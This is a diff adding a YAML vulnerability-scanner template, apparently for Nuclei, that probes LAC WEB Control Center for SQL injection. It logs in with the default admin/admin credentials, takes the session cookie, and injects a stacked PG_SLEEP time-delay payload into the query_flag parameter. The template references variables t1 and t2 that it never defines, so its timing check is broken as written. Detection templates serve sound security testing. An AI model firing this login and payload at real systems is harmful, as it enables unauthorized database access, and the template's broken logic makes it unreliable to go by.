@@ -1,0 +1,51 @@
+id: lac-web-control-center-sql-injection
+info:
+  name: LAC WEB Control Center SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    LAC WEB Control Center is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.
+
+http:
+  - id: login-request
+    method: POST
+    path:
+      - "/index.php?a=checklogin&m=public"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      account=admin&password=admin
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        group: 1
+        regex:
+          - "PHPSESSID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "登录成功"
+
+  - id: sqli-detection
+    method: GET
+    path:
+      - "/index.php/apbasic/index?tag=13&query_id=id&query_flag=123;SELECT+PG_SLEEP({{t1}})--&query_style=input&query_require=%3D&query_field_id=&query_field_sort=&query_submit=%E6%9F%A5%E8%AF%A2"
+    headers:
+      Cookie: PHPSESSID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "apid"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) * 2"
+          - "duration <= to_number(t2)"
